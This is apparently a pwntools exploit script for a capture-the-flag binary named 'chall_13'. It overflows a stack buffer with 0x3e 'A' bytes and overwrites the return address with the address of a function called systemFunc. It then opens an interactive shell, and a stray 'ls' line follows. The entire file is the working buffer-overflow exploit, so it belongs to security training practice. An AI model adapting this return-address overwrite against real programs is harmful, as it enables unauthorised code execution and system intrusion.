from pwn import *
p = process ("./chall_13")
context.arch = "i386" 
elf = ELF("./chall_13") 

p.recv()
p.sendline()

payload = b''
payload += (0x3a+0x4) * b'A'
payload += p32(elf.sym.systemFunc)

p.sendline(payload)
p.interactive()
ls